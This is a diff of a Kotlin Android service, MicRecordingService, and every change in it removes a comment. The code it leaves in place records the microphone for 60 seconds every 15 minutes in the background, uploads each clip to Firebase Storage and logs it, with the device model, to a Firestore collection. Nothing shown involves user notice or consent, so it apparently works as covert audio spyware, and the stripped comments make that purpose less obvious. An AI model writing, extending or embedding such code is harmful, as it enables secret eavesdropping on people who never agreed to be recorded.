@@ -17,13 +17,11 @@ class MicRecordingService : Service() {
     private var recorder: MediaRecorder? = null
     private lateinit var audioFile: File
     private val handler = Handler(Looper.getMainLooper())
-    private val recordingDuration = 60 * 1000L // 60 seconds
-    private val recordingInterval = 15 * 60 * 1000L // 15 minutes
+    private val recordingDuration = 60 * 1000L 
+    private val recordingInterval = 15 * 60 * 1000L 
     
-    // Track whether we're currently recording
     private var isRecording = false
     
-    // Runnable to schedule recordings
     private val recordingRunnable = object : Runnable {
         override fun run() {
             if (!isRecording) {
@@ -35,7 +33,7 @@ class MicRecordingService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        // Start the recording cycle
+        
         handler.post(recordingRunnable)
     }
 
@@ -57,7 +55,6 @@ class MicRecordingService : Service() {
                 start()
             }
             
-            // Schedule recording stop after set duration
             handler.postDelayed({
                 stopRecordingAndUpload()
             }, recordingDuration)
@@ -75,7 +72,6 @@ class MicRecordingService : Service() {
             recorder = null
             isRecording = false
             
-            // Upload the audio file
             if (audioFile.exists() && audioFile.length() > 0) {
                 uploadAudioFile()
             }
@@ -97,17 +93,15 @@ class MicRecordingService : Service() {
             if (task.isSuccessful) {
                 val downloadUrl = task.result.toString()
                 
-                // Store metadata in Firestore
                 val audioData = hashMapOf(
                     "url" to downloadUrl,
                     "timestamp" to com.google.firebase.Timestamp.now(),
-                    "duration" to recordingDuration / 1000, // Convert to seconds
+                    "duration" to recordingDuration / 1000, 
                     "deviceId" to android.os.Build.MODEL
                 )
                 
                 db.collection("audio_logs").add(audioData)
                 
-                // Delete the temporary file
                 audioFile.delete()
             }
         }
@@ -115,10 +109,9 @@ class MicRecordingService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        // Remove callbacks to avoid memory leaks
+        
         handler.removeCallbacks(recordingRunnable)
         
-        // Stop any active recording
         if (isRecording) {
             stopRecordingAndUpload()
         }
